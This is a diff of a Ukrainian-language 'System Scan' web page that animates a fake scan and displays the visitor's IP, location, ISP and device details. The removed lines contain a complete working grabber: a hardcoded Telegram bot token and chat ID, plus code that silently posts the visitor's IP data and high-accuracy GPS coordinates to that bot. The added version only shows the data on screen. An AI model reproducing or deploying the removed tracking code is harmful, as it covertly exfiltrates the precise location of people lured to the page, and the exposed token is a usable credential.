@@ -1,24 +1,26 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Scan</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-    <style>
-        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; }
-        .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
-        .container { width: 90%; max-width: 800px; margin: 40px auto; }
-        .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); }
-        .show { opacity: 1; transform: translateY(0); }
-        .label { color: #94a3b8; font-size: 12px; }
-        .value { color: white; margin-top: 5px; word-break: break-all; }
-        .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
-        .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); }
-        #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Scan</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+
+<style>
+    body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; }
+    .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
+    .container { width: 90%; max-width: 800px; margin: 40px auto; }
+    .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); }
+    .show { opacity: 1; transform: translateY(0); }
+    .label { color: #94a3b8; font-size: 12px; }
+    .value { color: white; margin-top: 5px; word-break: break-all; }
+    .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
+    .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); }
+    #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+    .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
+</style>
 </head>
+
 <body>
 
 <div class="status" id="statusText">SCANNING SYSTEM...</div>
@@ -42,16 +44,12 @@
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
-const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
-const TG_CHAT_ID = "7445429506";
-
-// Таймер
+// час
 setInterval(() => {
-    const el = document.getElementById("time");
-    if(el) el.innerText = new Date().toLocaleString();
+    document.getElementById("time").innerText = new Date().toLocaleString();
 }, 1000);
 
-// Прогрес-бар
+// прогрес
 let p = 0;
 let scan = setInterval(() => {
     p++;
@@ -64,57 +62,30 @@ let scan = setInterval(() => {
     }
 }, 20);
 
-function sendToTelegram(d, type = "IP") {
-    // Безпечне отримання полів, щоб код не падав
-    const ip = d.ip || "Unknown";
-    const city = d.city || "Unknown";
-    const country = d.country_name || d.country || "Unknown";
-    const isp = d.org || d.isp || "Unknown";
-    const lat = d.latitude || 0;
-    const lon = d.longitude || 0;
-
-    const text = `
-🔔 *${type === 'GPS' ? '🎯 ТОЧНА ЛОКАЦІЯ' : '🌐 ДАНІ ПО IP'}*
-🌐 *IP:* ${ip}
-🌍 *Місце:* ${city}, ${country}
-🏢 *Провайдер:* ${isp}
-📱 *OS:* ${navigator.platform}
-🔗 *Maps:* https://www.google.com/maps?q=${lat},${lon}
-    `;
-
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
-    }).catch(e => console.log("TG Error:", e));
-}
-
 function startLogic() {
-    // Використовуємо ipapi.co (він надійний для HTTPS)
+
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
-            // 1. Відразу відправляємо лог в ТГ
-            sendToTelegram(data, "IP");
 
-            // 2. Анімація появи даних для користувача
             setTimeout(() => {
-                document.getElementById("ip").innerText = data.ip || "Error";
+                document.getElementById("ip").innerText = data.ip;
                 document.getElementById("ipBox").classList.add("show");
             }, 300);
 
             setTimeout(() => {
-                document.getElementById("location").innerText = `${data.city || '?'}, ${data.country_name || '?'}`;
+                document.getElementById("location").innerText =
+                    `${data.city}, ${data.country_name}`;
                 document.getElementById("countryBox").classList.add("show");
             }, 600);
 
             setTimeout(() => {
-                document.getElementById("isp").innerText = data.org || "Unknown Provider";
+                document.getElementById("isp").innerText = data.org;
                 document.getElementById("ispBox").classList.add("show");
             }, 900);
 
             setTimeout(() => {
-                document.getElementById("device").innerText = navigator.userAgent.split(') ')[1] || navigator.platform;
+                document.getElementById("device").innerText = navigator.userAgent;
                 document.getElementById("deviceBox").classList.add("show");
             }, 1200);
 
@@ -122,47 +93,47 @@ function startLogic() {
                 document.getElementById("timeBox").classList.add("show");
             }, 1500);
 
-            // 3. Запит GPS та карта
+            // додаткові дані
             setTimeout(() => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const gpsData = {
-                                ...data,
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude
-                            };
-                            sendToTelegram(gpsData, "GPS");
-                            showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Ви тут");
-                        },
-                        () => {
-                            showMap(data.latitude, data.longitude, data.city);
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } else {
-                    showMap(data.latitude, data.longitude, data.city);
-                }
-            }, 1800);
+                const extra = document.createElement("div");
+                extra.className = "box show";
+                extra.innerHTML = `
+                    <div class="label">EXTRA DATA</div>
+                    <div class="value">
+                        LANGUAGE: ${navigator.language} <br>
+                        SCREEN: ${screen.width}x${screen.height} <br>
+                        TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone} <br>
+                        COOKIES: ${navigator.cookieEnabled ? "YES" : "NO"} <br>
+                        CPU CORES: ${navigator.hardwareConcurrency || "Unknown"}
+                    </div>
+                `;
+                document.querySelector(".container").appendChild(extra);
+            }, 1700);
+
+            setTimeout(() => {
+                showMap(data.latitude, data.longitude, data.city);
+            }, 2000);
+
         })
-        .catch(err => {
-            console.log("Fetch Error:", err);
-            document.getElementById("statusText").innerText = "CONNECTION ERROR";
+        .catch(() => {
+            document.getElementById("statusText").innerText = "ERROR";
         });
 }
 
 function showMap(lat, lon, label) {
-    const mapEl = document.getElementById("map");
-    mapEl.style.display = "block";
+    document.getElementById("map").style.display = "block";
     document.getElementById("statusText").innerText = "SUCCESS";
     document.getElementById("successText").style.display = "block";
-    
-    // Перевірка, чи карта вже ініціалізована
+
     if (window.myMap) window.myMap.remove();
-    
-    window.myMap = L.map('map').setView([lat, lon], 14);
+
+    window.myMap = L.map('map').setView([lat, lon], 13);
+
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
-    L.marker([lat, lon]).addTo(window.myMap).bindPopup(label).openPopup();
+
+    L.marker([lat, lon]).addTo(window.myMap)
+        .bindPopup(label || "User location")
+        .openPopup();
 }
 </script>
 
